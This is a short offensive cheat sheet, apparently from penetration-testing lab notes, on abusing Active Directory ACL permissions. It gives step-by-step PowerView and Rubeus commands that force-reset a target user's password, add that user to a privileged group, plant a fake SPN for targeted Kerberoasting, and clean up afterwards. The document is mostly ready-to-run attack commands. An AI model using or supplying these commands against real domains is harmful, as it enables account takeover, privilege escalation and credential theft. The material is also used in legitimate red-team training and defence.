# 01.01 ACL Abuse ForceChangePassword GenericWrite Add-DomainGroupMember

> Wield `Set-DomainUserPassword`, `Add-DomainGroupMember`, and `Set-DomainObject` (fake SPN) to exploit ForceChangePassword / GenericWrite ACEs.

## Overview

After identifying abusable ACEs, use PowerView functions to exploit them: Set-DomainUserPassword (ForceChangePassword), Add-DomainGroupMember (GenericWrite on a group), and Set-DomainObject to create a fake SPN for targeted Kerberoasting. Authenticate as the controlling user via PSCredential objects.

## Steps

- Create PSCredential object for the controlling user.
- Set-DomainUserPassword to force-reset target user's password.
- Add-DomainGroupMember to add the target user to a privileged group.
- Set-DomainObject -SET serviceprincipalname to create fake SPN for targeted Kerberoast.
- Rubeus kerberoast /user: against the target with fake SPN.
- Cleanup: Set-DomainObject -Clear serviceprincipalname, then Remove-DomainGroupMember.

## Commands

### PSCredential

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\wley', $SecPassword)
```

### Force change password

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force; Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### Add to group

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

### Create fake SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Targeted Kerberoast

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

### Cleanup fake SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose; Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
